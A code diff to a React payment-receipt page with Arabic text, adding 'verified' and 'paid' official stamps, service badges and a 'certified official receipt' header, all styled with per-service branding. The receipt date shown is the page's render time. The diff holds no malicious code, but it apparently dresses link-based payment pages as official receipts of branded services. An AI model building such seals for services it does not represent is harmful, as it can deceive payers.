@@ -4,7 +4,9 @@ import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";
+import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash, Shield, Award, BadgeCheck } from "lucide-react";
+import OfficialStamp from "@/components/OfficialStamp";
+import ServiceBadge from "@/components/ServiceBadge";
 
 const PaymentReceiptPage = () => {
   const { id } = useParams();
@@ -53,57 +55,135 @@ const PaymentReceiptPage = () => {
       icon={<CheckCircle className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
       showHero={false}
     >
-      {/* Success Icon */}
-      <div className="text-center mb-6 sm:mb-8">
+      {/* Success Section with Official Stamps */}
+      <div className="text-center mb-6 sm:mb-8 relative">
+        {/* Main Success Icon */}
         <div 
-          className="w-20 h-20 sm:w-24 sm:h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg"
+          className="w-20 h-20 sm:w-24 sm:h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg relative z-10"
           style={{
             background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
           }}
         >
           <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-white" />
         </div>
+
+        {/* Official Stamps - Positioned around */}
+        <div className="hidden sm:block absolute top-0 left-4 opacity-80">
+          <OfficialStamp 
+            serviceKey={serviceKey}
+            serviceName={serviceName}
+            type="verified"
+          />
+        </div>
+        <div className="hidden sm:block absolute top-0 right-4 opacity-80">
+          <OfficialStamp 
+            serviceKey={serviceKey}
+            serviceName={serviceName}
+            type="paid"
+          />
+        </div>
+
         <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: branding.colors.primary }}>
           تم الدفع بنجاح!
         </h1>
-        <p className="text-sm sm:text-base text-muted-foreground">
+        <p className="text-sm sm:text-base text-muted-foreground mb-3">
           شكراً لك على استخدام خدمة {serviceName}
         </p>
+        
+        {/* Service Badge */}
+        <div className="flex justify-center">
+          <ServiceBadge 
+            serviceKey={serviceKey}
+            serviceName={serviceName}
+            size="lg"
+          />
+        </div>
       </div>
 
-      {/* Receipt Details */}
-      <Card className="p-4 sm:p-6 mb-6" style={{ borderColor: branding.colors.primary }}>
-        <div className="space-y-4">
-          {/* Transaction ID */}
-          <div className="flex items-center justify-between py-2 border-b">
+      {/* Receipt Details - Official Style */}
+      <Card 
+        className="p-4 sm:p-6 mb-6 relative overflow-hidden" 
+        style={{ 
+          borderColor: branding.colors.primary,
+          borderWidth: '3px',
+          borderStyle: 'double'
+        }}
+      >
+        {/* Background Pattern */}
+        <div 
+          className="absolute inset-0 opacity-5"
+          style={{
+            backgroundImage: `repeating-linear-gradient(45deg, ${branding.colors.primary} 0, ${branding.colors.primary} 1px, transparent 0, transparent 50%)`,
+            backgroundSize: '10px 10px'
+          }}
+        />
+
+        {/* Official Header */}
+        <div className="relative z-10">
+          <div className="flex items-center justify-between mb-4 pb-3 border-b-2" style={{ borderColor: branding.colors.primary }}>
             <div className="flex items-center gap-2">
-              <Hash className="w-4 h-4 text-muted-foreground" />
-              <span className="text-sm font-medium">رقم المعاملة</span>
+              <Shield className="w-5 h-5" style={{ color: branding.colors.primary }} />
+              <span className="font-bold text-base sm:text-lg">إيصال رسمي</span>
             </div>
-            <span className="font-mono text-sm">{id}</span>
-          </div>
-          
-          {/* Date */}
-          <div className="flex items-center justify-between py-2 border-b">
             <div className="flex items-center gap-2">
-              <Calendar className="w-4 h-4 text-muted-foreground" />
-              <span className="text-sm font-medium">التاريخ والوقت</span>
+              <BadgeCheck className="w-5 h-5" style={{ color: branding.colors.secondary }} />
+              <span className="text-xs sm:text-sm font-semibold" style={{ color: branding.colors.secondary }}>
+                مُعتمد
+              </span>
             </div>
-            <span className="text-sm">{new Date().toLocaleString('ar-SA')}</span>
           </div>
-          
-          {/* Service */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <span className="text-sm font-medium">الخدمة</span>
-            <span className="text-sm font-semibold">{serviceName}</span>
+
+          <div className="space-y-4">
+            {/* Transaction ID */}
+            <div className="flex items-center justify-between py-2 border-b">
+              <div className="flex items-center gap-2">
+                <Hash className="w-4 h-4 text-muted-foreground" />
+                <span className="text-sm font-medium">رقم المعاملة</span>
+              </div>
+              <span className="font-mono text-sm font-bold">{id}</span>
+            </div>
+            
+            {/* Date */}
+            <div className="flex items-center justify-between py-2 border-b">
+              <div className="flex items-center gap-2">
+                <Calendar className="w-4 h-4 text-muted-foreground" />
+                <span className="text-sm font-medium">التاريخ والوقت</span>
+              </div>
+              <span className="text-sm font-semibold">{new Date().toLocaleString('ar-SA')}</span>
+            </div>
+            
+            {/* Service with Badge */}
+            <div className="flex items-center justify-between py-2 border-b">
+              <span className="text-sm font-medium">الخدمة</span>
+              <ServiceBadge 
+                serviceKey={serviceKey}
+                serviceName={serviceName}
+                size="sm"
+              />
+            </div>
+            
+            {/* Amount - Highlighted */}
+            <div 
+              className="flex items-center justify-between py-4 px-4 rounded-lg mt-4"
+              style={{
+                background: `linear-gradient(135deg, ${branding.colors.primary}10, ${branding.colors.secondary}10)`,
+                border: `2px solid ${branding.colors.primary}`
+              }}
+            >
+              <span className="text-lg font-bold">المبلغ المدفوع</span>
+              <span className="text-2xl sm:text-3xl font-bold" style={{ color: branding.colors.primary }}>
+                {formattedAmount}
+              </span>
+            </div>
           </div>
-          
-          {/* Amount */}
-          <div className="flex items-center justify-between py-3">
-            <span className="text-lg font-bold">المبلغ المدفوع</span>
-            <span className="text-2xl font-bold" style={{ color: branding.colors.primary }}>
-              {formattedAmount}
-            </span>
+
+          {/* Official Stamp at Bottom */}
+          <div className="flex justify-center mt-6 sm:hidden">
+            <OfficialStamp 
+              serviceKey={serviceKey}
+              serviceName={serviceName}
+              type="paid"
+            />
           </div>
         </div>
       </Card>
